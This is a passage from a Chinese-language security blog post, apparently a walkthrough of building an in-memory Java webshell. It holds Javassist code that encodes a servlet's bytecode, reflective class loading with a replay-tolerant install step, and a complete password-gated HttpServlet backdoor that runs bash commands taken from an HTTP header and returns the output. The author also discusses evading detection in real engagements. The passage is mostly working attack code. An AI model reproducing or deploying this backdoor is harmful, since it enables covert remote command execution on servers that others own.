</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            CtClass ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>memsHttpServlet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceClassName</span><span style=color:#f92672>(</span>memsHttpServlet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> <span style=color:#e6db74>&#34;pers.neo.memsHttpServletb&#34;</span><span style=color:#f92672>);</span> <span style=color:#75715e>//通过反射在每次测试时修改自定义servlet的名称，而不是频繁refactor那个类
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            String bytecode<span style=color:#f92672>=</span>Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getEncoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>encodeToString</span><span style=color:#f92672>(</span>ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>bytecode<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>换一个类名之后就报另一个错了 <code>Cannot cast 'java.lang.Class' to 'javax.servlet.http.HttpServlet'</code> 。</p><p><img loading=lazy src=image-20220704164505582.png alt=image-20220704164505582></p><p>这是我们的写法不对，不能将一个类cast成另一个类，应该先将他实例化，再将对象转化为其他类的的对象。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-111-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-111-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-111-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-111-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-111-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-111-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-111-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-111-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-111-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-111-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-111-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-111-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>String pers_neo_memsHttpServlet_bytecodestr<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yv66vgAAADExxxxxxxxx……&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> code<span style=color:#f92672>=</span> Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getDecoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>decode</span><span style=color:#f92672>(</span>pers_neo_memsHttpServlet_bytecodestr<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>Method defineClass<span style=color:#f92672>=</span>ClassLoader<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;defineClass&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>defineClass<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>Class memsHttpServlet<span style=color:#f92672>=(</span>Class<span style=color:#f92672>)</span>defineClass<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>ClassLoader<span style=color:#f92672>.</span><span style=color:#a6e22e>getSystemClassLoader</span><span style=color:#f92672>(),</span>code<span style=color:#f92672>,</span><span style=color:#ae81ff>0</span><span style=color:#f92672>,</span>code<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>);</span> <span style=color:#75715e>//类型转换
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>HttpServlet httpServlet<span style=color:#f92672>=(</span>HttpServlet<span style=color:#f92672>)</span>memsHttpServlet<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>();</span> <span style=color:#75715e>//类型转换
</span></span></span></code></pre></td></tr></table></div></div><h4 id=webshell密码判断的写法出错>webshell密码判断的写法出错<a hidden class=anchor aria-hidden=true href=#webshell密码判断的写法出错>#</a></h4><p>一切都很好，就是没有结果。原来是因为我比较密码的写法不对，应该使用 <code>.equals</code> 而不是 <code>==</code> 。前者默认是引用比较，后者对基本类型是值比较，对引用类型是引用比较。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-112-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-112-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-112-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-112-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>boolean</span> a<span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;p4ssw0rd!&#34;</span><span style=color:#f92672>==(</span>httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-fur&#34;</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>boolean</span> b<span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;p4ssw0rd!&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-fur&#34;</span><span style=color:#f92672>));</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=增强兼容无限重放>增强兼容，无限重放<a hidden class=anchor aria-hidden=true href=#增强兼容无限重放>#</a></h4><p>至此已经基本完成了，除了一处缺陷，就是自定义的那个字节码的类每次发送payload都要修改类名，每打一次就要换一个名字，重放请求就会因为加载类失败而报500的错误，因为不能尝试加载全限定名完全相同的类。</p><p>是否能尝试再执行反序列化之前先搜索内存中是否已经有该版本的类？如果可以的话，就可以反复使用同一个请求来增加和删除内存马而不会在内存中留下很多无用的类。</p><p>确实可以，修改代码实现可无限重放安装内存马的请求。可以任意重放而不报错，也便于再卸载内存马之后重新安装。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-113-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-113-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-113-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-113-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-113-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-113-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-113-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-113-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-113-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-113-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-113-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-113-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-113-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-113-7>7</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>try</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>//in case we may want to replay memsi request 我们会想要重放同一个安装内存马的请求，使用这个try catch可以增强兼容性。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    memsHttpServlet<span style=color:#f92672>=(</span>Class<span style=color:#f92672>)</span>defineClass<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>ClassLoader<span style=color:#f92672>.</span><span style=color:#a6e22e>getSystemClassLoader</span><span style=color:#f92672>(),</span>code<span style=color:#f92672>,</span><span style=color:#ae81ff>0</span><span style=color:#f92672>,</span>code<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span><span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>InvocationTargetException e<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>    memsHttpServlet<span style=color:#f92672>=</span>Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;pers.neo.memsHttpServletb&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>HttpServlet httpServlet<span style=color:#f92672>=(</span>HttpServlet<span style=color:#f92672>)</span>memsHttpServlet<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>();</span>
</span></span></code></pre></td></tr></table></div></div><p>至此基本完美。</p><h3 id=优缺点-4>优缺点<a hidden class=anchor aria-hidden=true href=#优缺点-4>#</a></h3><p>优点：</p><ol><li>实现任意安装，卸载，稳定而隐秘的命令执行和回显。</li></ol><p>缺点：</p><ol><li>最开始觉得是完美的，除了重启JVM会失去shell。</li><li>实战告诉我需要还增加流量加密功能，直接将命令暴露在HTTP请求中很容易被检测到。</li></ol><h3 id=最终效果-6>最终效果<a hidden class=anchor aria-hidden=true href=#最终效果-6>#</a></h3><p><img loading=lazy src=image-20220704174122975.png alt=image-20220704174122975></p><p>自定义的httpservlet：memsHttpServlet.java</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-21>21</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServlet<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletRequest<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletResponse<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>memsHttpServlet</span> <span style=color:#66d9ef>extends</span> HttpServlet <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>doGet</span><span style=color:#f92672>(</span>HttpServletRequest req<span style=color:#f92672>,</span> HttpServletResponse resp<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        String passwd<span style=color:#f92672>=</span>req<span style=color:#f92672>.</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-fur&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span><span style=color:#f92672>(!</span><span style=color:#e6db74>&#34;p4ssw0rd!&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>passwd<span style=color:#f92672>)){</span><span style=color:#66d9ef>return</span><span style=color:#f92672>;}</span>
</span></span><span style=display:flex><span>        String<span style=color:#f92672>[]</span> cmdarray<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> String<span style=color:#f92672>[]{</span><span style=color:#e6db74>&#34;bash&#34;</span><span style=color:#f92672>,</span><span style=color:#e6db74>&#34;-c&#34;</span><span style=color:#f92672>,</span>req<span style=color:#f92672>.</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-far&#34;</span><span style=color:#f92672>)};</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Scanner</span> s <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Scanner</span><span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>cmdarray<span style=color:#f92672>).</span><span style=color:#a6e22e>getInputStream</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>useDelimiter</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\\A&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            resp<span style=color:#f92672>.</span><span style=color:#a6e22e>getWriter</span><span style=color:#f92672>().</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>s<span style=color:#f92672>.</span><span style=color:#a6e22e>hasNext</span><span style=color:#f92672>()</span> <span style=color:#f92672>?</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>()</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>为httpservlet生成字节码：memsHttpServletGenByteCode.java</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.ClassIdentity<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.ClassPool<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.CtClass<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>memsHttpServletGenByteCode</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            CtClass ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>memsHttpServlet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
